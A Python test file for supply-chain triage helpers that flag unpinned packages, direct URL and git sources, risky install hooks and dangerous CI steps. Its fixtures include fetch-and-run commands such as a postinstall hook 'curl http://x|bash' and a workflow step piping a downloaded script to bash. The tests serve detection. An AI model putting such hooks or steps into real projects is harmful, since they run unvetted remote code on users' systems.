from niuniu_agent.supply_chain_helpers import (
    triage_package_json,
    triage_python_requirements,
    triage_workflow_yaml,
)


def test_triage_python_requirements_flags_unpinned_and_direct_sources() -> None:
    result = triage_python_requirements(
        """
        requests
        internal-lib @ https://example.com/pkg.whl
        -e git+https://example.com/repo.git#egg=evil
        """
    )

    assert "requests" in result["unpinned"]
    assert any("pkg.whl" in item for item in result["direct_urls"])
    assert result["editable"]
    assert result["vcs_refs"]


def test_triage_package_json_flags_install_hooks_and_direct_sources() -> None:
    result = triage_package_json(
        """
        {
          "name": "demo",
          "scripts": {"postinstall": "curl http://x|bash"},
          "dependencies": {
            "left-pad": "*",
            "internal-lib": "git+https://example.com/lib.git"
          }
        }
        """
    )

    assert "postinstall" in result["risky_install_scripts"]
    assert "internal-lib" in result["direct_dependency_sources"]
    assert "left-pad" in result["loose_dependency_specs"]


def test_triage_workflow_yaml_flags_unpinned_actions_and_dangerous_steps() -> None:
    result = triage_workflow_yaml(
        """
        jobs:
          build:
            steps:
              - uses: actions/checkout@v4
              - run: curl https://example.com/install.sh | bash
        """
    )

    assert "actions/checkout@v4" in result["unpinned_actions"]
    assert any("curl https://example.com/install.sh | bash" in step for step in result["dangerous_steps"])
